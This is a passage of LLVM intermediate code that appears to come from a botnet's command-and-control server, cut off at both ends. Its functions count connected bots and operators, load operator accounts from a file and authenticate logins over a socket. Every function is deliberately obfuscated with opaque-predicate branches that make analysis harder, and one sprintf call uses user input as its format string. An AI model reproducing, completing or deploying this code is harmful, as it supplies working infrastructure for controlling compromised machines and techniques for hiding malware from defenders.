  store i32 %19, i32* %1, align 4
  br label %3

; <label>:20:                                     ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

; <label>:7:                                      ; preds = %originalBBpart24, %1
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 2048, i32 16, i1 false)
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %18 = call i32 @BotsConnected()
  %19 = load volatile i32, i32* @OperatorsConnected, align 4
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %17, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %18, i32 %19, i32 7) #7
  %21 = load i32, i32* %3, align 4
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %24 = call i64 @strlen(i8* %23) #8
  %25 = call i64 @send(i32 %21, i8* %22, i64 %24, i32 16384)
  %26 = icmp eq i64 %25, -1
  %27 = load i32, i32* @x.11
  %28 = load i32, i32* @y.12
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  ret i8* null

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i32, i32* @x.11
  %38 = load i32, i32* @y.12
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %45 = call i32 @sleep(i32 2)
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %7

originalBBalteredBB:                              ; preds = %originalBB, %7
  %54 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 16, i1 false)
  %55 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %56 = call i32 @BotsConnected()
  %57 = load volatile i32, i32* @OperatorsConnected, align 4
  %58 = call i32 (i8*, i8*, ...) @sprintf(i8* %55, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %56, i32 %57, i32 7) #7
  %59 = load i32, i32* %3, align 4
  %60 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %61 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #8
  %63 = call i64 @send(i32 %59, i8* %60, i64 %62, i32 16384)
  %64 = icmp eq i64 %63, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  %65 = call i32 @sleep(i32 2)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %106

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %originalBBpart24, %12
  %14 = load i32, i32* @x.13
  %15 = load i32, i32* @y.14
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %23 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %24 = call i8* @fgets(i8* %22, i32 512, %struct._IO_FILE* %23)
  %25 = icmp ne i8* %24, null
  %26 = load i32, i32* @x.13
  %27 = load i32, i32* @y.14
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %62

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %36 = load i8*, i8** %3, align 8
  %37 = call i8* @strstr(i8* %35, i8* %36) #8
  %38 = icmp ne i8* %37, null
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %34
  %40 = load i32, i32* %6, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %6, align 4
  %42 = load i32, i32* %5, align 4
  store i32 %42, i32* %7, align 4
  br label %43

; <label>:43:                                     ; preds = %39, %34
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %5, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %5, align 4
  %54 = load i32, i32* @x.13
  %55 = load i32, i32* @y.14
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %13

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %64 = icmp ne %struct._IO_FILE* %63, null
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %62
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* %66)
  br label %68

; <label>:68:                                     ; preds = %65, %62
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* @x.13
  %73 = load i32, i32* @y.14
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  store i32 0, i32* %2, align 4
  %80 = load i32, i32* @x.13
  %81 = load i32, i32* @y.14
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %106

; <label>:88:                                     ; preds = %68
  %89 = load i32, i32* @x.13
  %90 = load i32, i32* @y.14
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i32, i32* %7, align 4
  store i32 %97, i32* %2, align 4
  %98 = load i32, i32* @x.13
  %99 = load i32, i32* @y.14
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %106

; <label>:106:                                    ; preds = %originalBBpart212, %originalBBpart28, %11
  %107 = load i32, i32* %2, align 4
  ret i32 %107

originalBBalteredBB:                              ; preds = %originalBB, %13
  %108 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %109 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %110 = call i8* @fgets(i8* %108, i32 512, %struct._IO_FILE* %109)
  %111 = icmp ne i8* %110, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %112 = load i32, i32* %5, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  store i32 0, i32* %2, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %114 = load i32, i32* %7, align 4
  store i32 %114, i32* %2, align 4
  br label %originalBB10
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca [80 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [2048 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca %struct._IO_FILE*, align 8
  %57 = alloca i64, align 8
  %58 = alloca %struct.tm*, align 8
  %59 = alloca [50 x i8], align 16
  %60 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %61 = load i8*, i8** %3, align 8
  %62 = ptrtoint i8* %61 to i32
  store i32 %62, i32* %4, align 4
  %63 = load volatile i32, i32* @OperatorsConnected, align 4
  %64 = add nsw i32 %63, 1
  store volatile i32 %64, i32* @OperatorsConnected, align 4
  %65 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 2048, i32 16, i1 false)
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 2048, i32 16, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 2048, i32 16, i1 false)
  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %14, align 4
  %69 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %69, %struct._IO_FILE** %13, align 8
  br label %70

; <label>:70:                                     ; preds = %originalBBpart214, %1
  %71 = load i32, i32* @x.15
  %72 = load i32, i32* @y.16
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %70
  %79 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %80 = call i32 @feof(%struct._IO_FILE* %79) #7
  %81 = icmp ne i32 %80, 0
  %82 = xor i1 %81, true
  %83 = load i32, i32* @x.15
  %84 = load i32, i32* @y.16
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %82, label %91, label %112

; <label>:91:                                     ; preds = %originalBBpart2
  %92 = load i32, i32* @x.15
  %93 = load i32, i32* @y.16
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %101 = call i32 @fgetc(%struct._IO_FILE* %100)
  store i32 %101, i32* %15, align 4
  %102 = load i32, i32* %14, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %14, align 4
  %104 = load i32, i32* @x.15
  %105 = load i32, i32* @y.16
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %70

; <label>:112:                                    ; preds = %originalBBpart2
  %113 = load i32, i32* @x.15
  %114 = load i32, i32* @y.16
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %112
  store i32 0, i32* %16, align 4
  %121 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %121)
  %122 = load i32, i32* @x.15
  %123 = load i32, i32* @y.16
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %130

; <label>:130:                                    ; preds = %135, %originalBBpart218
  %131 = load i32, i32* %16, align 4
  %132 = load i32, i32* %14, align 4
  %133 = sub nsw i32 %132, 1
  %134 = icmp ne i32 %131, %133
  br i1 %134, label %135, label %150

; <label>:135:                                    ; preds = %130
  %136 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %137 = load i32, i32* %16, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.login_info, %struct.login_info* %139, i32 0, i32 0
  %141 = getelementptr inbounds [20 x i8], [20 x i8]* %140, i32 0, i32 0
  %142 = load i32, i32* %16, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %143
  %145 = getelementptr inbounds %struct.login_info, %struct.login_info* %144, i32 0, i32 1
  %146 = getelementptr inbounds [20 x i8], [20 x i8]* %145, i32 0, i32 0
  %147 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %136, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %141, i8* %146)
  %148 = load i32, i32* %16, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %16, align 4
  br label %130

; <label>:150:                                    ; preds = %130
  %151 = load i32, i32* %4, align 4
  %152 = call i64 @send(i32 %151, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %153 = icmp eq i64 %152, -1
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %150
  br label %1940

; <label>:155:                                    ; preds = %150
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %157 = load i32, i32* %4, align 4
  %158 = call i32 @fdgets(i8* %156, i32 2048, i32 %157)
  %159 = icmp slt i32 %158, 1
  br i1 %159, label %160, label %177

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* @x.15
  %162 = load i32, i32* @y.16
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %160
  %169 = load i32, i32* @x.15
  %170 = load i32, i32* @y.16
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %1940

; <label>:177:                                    ; preds = %155
  %178 = load i32, i32* @x.15
  %179 = load i32, i32* @y.16
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %177
  %186 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %186)
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %188
  %190 = getelementptr inbounds %struct.login_info, %struct.login_info* %189, i32 0, i32 0
  %191 = getelementptr inbounds [20 x i8], [20 x i8]* %190, i32 0, i32 0
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %191, i8* %192) #7
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %194, i8** %17, align 8
  %195 = load i8*, i8** %17, align 8
  %196 = call i32 @Find_Login(i8* %195)
  store i32 %196, i32* %5, align 4
  %197 = load i8*, i8** %17, align 8
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %199
  %201 = getelementptr inbounds %struct.login_info, %struct.login_info* %200, i32 0, i32 0
  %202 = getelementptr inbounds [20 x i8], [20 x i8]* %201, i32 0, i32 0
  %203 = call i32 @strcmp(i8* %197, i8* %202) #8
  %204 = icmp eq i32 %203, 0
  %205 = load i32, i32* @x.15
  %206 = load i32, i32* @y.16
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %204, label %213, label %317

; <label>:213:                                    ; preds = %originalBBpart226
  %214 = load i32, i32* @x.15
  %215 = load i32, i32* @y.16
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %213
  %222 = load i32, i32* %4, align 4
  %223 = call i64 @send(i32 %222, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %224 = icmp eq i64 %223, -1
  %225 = load i32, i32* @x.15
  %226 = load i32, i32* @y.16
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %224, label %233, label %234

; <label>:233:                                    ; preds = %originalBBpart230
  br label %1940

; <label>:234:                                    ; preds = %originalBBpart230
  %235 = load i32, i32* @x.15
  %236 = load i32, i32* @y.16
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %234
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %244 = load i32, i32* %4, align 4
  %245 = call i32 @fdgets(i8* %243, i32 2048, i32 %244)
  %246 = icmp slt i32 %245, 1
  %247 = load i32, i32* @x.15
  %248 = load i32, i32* @y.16
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %246, label %255, label %256

; <label>:255:                                    ; preds = %originalBBpart234
  br label %1940

; <label>:256:                                    ; preds = %originalBBpart234
  %257 = load i32, i32* @x.15
  %258 = load i32, i32* @y.16
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %256
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %265)
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %268
  %270 = getelementptr inbounds %struct.login_info, %struct.login_info* %269, i32 0, i32 1
  %271 = getelementptr inbounds [20 x i8], [20 x i8]* %270, i32 0, i32 0
  %272 = call i32 @strcmp(i8* %266, i8* %271) #8
  %273 = icmp ne i32 %272, 0
  %274 = load i32, i32* @x.15
  %275 = load i32, i32* @y.16
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %273, label %282, label %299

; <label>:282:                                    ; preds = %originalBBpart238
  %283 = load i32, i32* @x.15
  %284 = load i32, i32* @y.16
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %282
  %291 = load i32, i32* @x.15
  %292 = load i32, i32* @y.16
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %318

; <label>:299:                                    ; preds = %originalBBpart238
  %300 = load i32, i32* @x.15
  %301 = load i32, i32* @y.16
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %299
  %308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %308, i8 0, i64 2048, i32 16, i1 false)
  %309 = load i32, i32* @x.15
  %310 = load i32, i32* @y.16
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %367

; <label>:317:                                    ; preds = %originalBBpart226
  br label %318

; <label>:318:                                    ; preds = %317, %originalBBpart242
  %319 = load i32, i32* %4, align 4
  %320 = call i64 @send(i32 %319, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %321 = icmp eq i64 %320, -1
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %318
  br label %1940

; <label>:323:                                    ; preds = %318
  %324 = load i32, i32* @x.15
  %325 = load i32, i32* @y.16
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %323
  %332 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %333 = call i32 (i8*, i8*, ...) @sprintf(i8* %332, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i32 0, i32 0)) #7
  %334 = load i32, i32* %4, align 4
  %335 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
